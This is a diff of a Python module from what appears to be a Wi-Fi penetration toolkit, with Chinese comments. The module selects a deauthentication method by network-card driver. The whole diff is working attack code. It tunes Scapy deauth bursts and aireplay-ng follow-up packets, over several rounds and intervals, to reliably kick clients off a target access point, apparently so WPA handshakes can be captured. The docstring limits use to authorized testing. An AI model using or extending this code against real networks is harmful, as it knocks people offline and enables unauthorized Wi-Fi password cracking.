@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""统一 deauth 入口：Scapy（主）+ aireplay（辅）。
+"""统一 deauth 入口：按网卡驱动选发包方式，保证踢得下。
 
-默认策略 (deauth_engine=auto)：
-  1) 有 scapy → 按 MT7921U 参考脚本突发（主注入）
-  2) 再 aireplay-ng -0 轻量补刀（兼容无 scapy / 旧驱动）
-  3) 无 scapy → 仅 aireplay
+默认策略:
+  1) 探测驱动（sysfs / ethtool / airmon）→ nic_profile
+  2) mt76 等：Scapy 高密度突发（×4 轮）为主 + aireplay 补刀
+  3) Realtek：加大 aireplay 包数 + 更密 Scapy
+  4) Broadcom：优先 aireplay
+  5) 用户 --deauth-engine 可强制覆盖
 
-Scapy 帧模板/reason/burst 见 tools/scapy_deauth.py
-（对齐 wifi-crack-kali/自动攻击/auto_attack.py 发送侧）。
+爆发后静默监听（默认 10s）由 AttackWPA 控制，本模块只负责「踢」。
 
 仅限授权测试；MFP(802.11w) 目标无法靠 deauth 踢站。
 """
@@ -18,64 +19,127 @@ from __future__ import annotations
 from typing import Optional
 
 from ..config import Configuration
+from ..util.color import Color
 from .aireplay import Aireplay
 from .scapy_deauth import ScapyDeauth
+from .nic_profile import get_deauth_profile, describe_profile
+
+
+_profile_announced = False
 
 
 def engine() -> str:
-    '''auto | both | scapy | aireplay'''
+    '''用户强制: auto | both | scapy | aireplay'''
     raw = str(getattr(Configuration, 'deauth_engine', 'auto') or 'auto').strip().lower()
     if raw in ('both', 'scapy', 'aireplay', 'auto'):
         return raw
     return 'auto'
 
 
+def _resolve_mode(prof_engine: str) -> tuple[bool, bool]:
+    '''返回 (use_scapy, use_aireplay)。'''
+    user = engine()
+    scapy_ok = ScapyDeauth.available()
+
+    if user == 'scapy':
+        return (scapy_ok, not scapy_ok)  # 无 scapy 则降级 aireplay
+    if user == 'aireplay':
+        return (False, True)
+    if user == 'both':
+        return (scapy_ok, True)
+
+    # auto：跟网卡 profile
+    pe = (prof_engine or 'both').lower()
+    if pe == 'scapy':
+        return (scapy_ok, not scapy_ok)
+    if pe == 'aireplay':
+        return (False, True)
+    # both
+    return (scapy_ok, True)
+
+
 def send_deauth(
     target_bssid: str,
     client_mac: Optional[str] = None,
     essid: Optional[str] = None,
-    timeout: float = 2.0,
+    timeout: float = 3.0,
 ) -> dict:
-    """对目标发 deauth。返回 {scapy: n, aireplay: bool}。"""
+    """对目标发 deauth。返回 {scapy, aireplay, profile, skipped}。"""
+    global _profile_announced
+
     if getattr(Configuration, 'no_deauth', False):
-        return {'scapy': 0, 'aireplay': False, 'skipped': True}
+        return {'scapy': 0, 'aireplay': False, 'skipped': True, 'profile': None}
 
-    mode = engine()
-    use_scapy = mode in ('auto', 'both', 'scapy')
-    use_aireplay = mode in ('auto', 'both', 'aireplay')
+    iface = getattr(Configuration, 'interface', None) or ''
+    prof = get_deauth_profile(iface)
 
-    scapy_ok = ScapyDeauth.available()
-    if mode == 'auto':
-        # auto：有 scapy 则双通道，否则仅 aireplay
-        use_scapy = scapy_ok
-        use_aireplay = True
-    elif mode == 'scapy' and not scapy_ok:
-        use_scapy = False
-        use_aireplay = True  # 降级
+    if not _profile_announced:
+        Color.pl('{+} {C}deauth{W}: {D}%s{W}' % describe_profile(iface))
+        _profile_announced = True
 
-    result = {'scapy': 0, 'aireplay': False, 'skipped': False}
+    use_scapy, use_aireplay = _resolve_mode(prof.engine)
 
-    if use_scapy and scapy_ok:
+    # 用户显式 scapy 份数覆盖 profile
+    try:
+        cfg_count = int(getattr(Configuration, 'scapy_deauth_count', 0) or 0)
+    except (TypeError, ValueError):
+        cfg_count = 0
+    per_dir = cfg_count if cfg_count > 0 else (prof.per_dir or None)
+
+    try:
+        rounds = int(getattr(Configuration, 'scapy_deauth_rounds', 0) or 0)
+    except (TypeError, ValueError):
+        rounds = 0
+    if rounds <= 0:
+        rounds = prof.rounds
+
+    try:
+        inter = float(getattr(Configuration, 'scapy_deauth_inter', 0) or 0)
+    except (TypeError, ValueError):
+        inter = 0.0
+    if inter <= 0:
+        inter = prof.inter
+
+    result = {
+        'scapy': 0,
+        'aireplay': False,
+        'skipped': False,
+        'profile': prof.name,
+        'rounds': rounds,
+    }
+
+    if use_scapy:
         result['scapy'] = ScapyDeauth.deauth(
             target_bssid,
             client_mac=client_mac,
+            count=per_dir,
+            iface=iface,
+            inter=inter,
+            rounds=rounds,
         )
 
     if use_aireplay:
-        # Scapy 已打过时 aireplay 少发几包即可；仅 aireplay 时用配置的 num_deauths
-        n = getattr(Configuration, 'num_deauths', 8) or 8
-        if result['scapy'] > 0:
-            n = max(2, min(n, 4))
-        try:
-            Aireplay.deauth(
-                target_bssid,
-                essid=essid,
-                client_mac=client_mac,
-                num_deauths=n,
-                timeout=timeout,
+        # 仅 aireplay 或 scapy 失败：用满 profile 包数；scapy 已成功则按 profile 决定是否补刀
+        if result['scapy'] > 0 and not prof.aireplay_after_scapy:
+            n = 0
+        elif result['scapy'] > 0:
+            n = max(4, min(prof.aireplay_count, 16))
+        else:
+            n = max(
+                int(getattr(Configuration, 'num_deauths', 8) or 8),
+                prof.aireplay_count,
             )
-            result['aireplay'] = True
-        except Exception:
-            result['aireplay'] = False
+        if n > 0:
+            try:
+                Aireplay.deauth(
+                    target_bssid,
+                    essid=essid,
+                    client_mac=client_mac,
+                    num_deauths=n,
+                    timeout=max(timeout, 3.0),
+                )
+                result['aireplay'] = True
+            except Exception:
+                result['aireplay'] = False
 
     return result
